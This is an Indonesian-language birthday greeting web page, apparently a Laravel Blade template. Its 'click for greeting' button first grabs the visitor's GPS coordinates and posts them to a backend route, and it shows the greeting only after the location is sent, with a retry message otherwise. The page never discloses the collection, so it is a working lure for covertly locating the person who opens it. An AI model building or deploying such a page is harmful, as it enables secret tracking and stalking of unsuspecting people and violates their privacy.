<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat Ulang Tahun</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body,
        html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .bg-image {
            background-image: url('https://images.unsplash.com/photo-1494790108377-be9c29b29330');
            /* Ganti dengan URL gambar latar belakang */
            background-size: cover;
            background-position: center;
            height: 100vh;
            /* Set ke 100% viewport height */
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            color: #fff;
            /* Warna teks putih untuk kontras yang lebih baik */
        }

        .centered-content {
            text-align: center;
            z-index: 1;
            /* Pastikan konten berada di atas latar belakang */
        }

        .btn-primary {
            background-color: #ff4081;
            border-color: #ff4081;
            font-size: 1.25rem;
        }

        .btn-primary:hover {
            background-color: #f50057;
            border-color: #f50057;
        }

        .birthday-message {
            display: none;
            color: white;
            font-size: 2rem;
            text-align: center;
            margin-top: 20px;
        }

        .celebrate-animation {
            animation: celebrate 3s ease-out;
        }

        @keyframes celebrate {
            0% {
                transform: scale(0.5);
                opacity: 0;
            }

            50% {
                transform: scale(1.1);
                opacity: 1;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="bg-image">
        <div class="centered-content">
            <button class="btn btn-primary btn-lg" id="showMessageBtn">Klik untuk Ucapan</button>
            <div class="birthday-message" id="birthdayMessage">
                <div class="celebrate-animation">
                    <h1>🎉 Selamat Ulang Tahun! 🎉</h1>
                    <p>Semoga hari ini menjadi hari yang istimewa dan penuh kebahagiaan!</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#showMessageBtn').click(function() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        var latt = position.coords.latitude;
                        var long = position.coords.longitude;

                        // Kirim data ke backend Laravel
                        $.ajax({
                            url: '{{ route('postLocation') }}', // URL ke route Laravel
                            type: 'POST',
                            data: {
                                _token: '{{ csrf_token() }}', // Token CSRF Laravel
                                latt: latt,
                                long: long
                            },
                            success: function(response) {
                                $('#birthdayMessage').fadeToggle('slow');

                            },
                            error: function(xhr, status, error) {
                                alert('Ada Masalah Coba Lagi!');
                            }
                        });
                    }, function(error) {
                        alert('Ada Masalah Coba Lagi!');
                    });
                }
            });
        });
    </script>
</body>

</html>
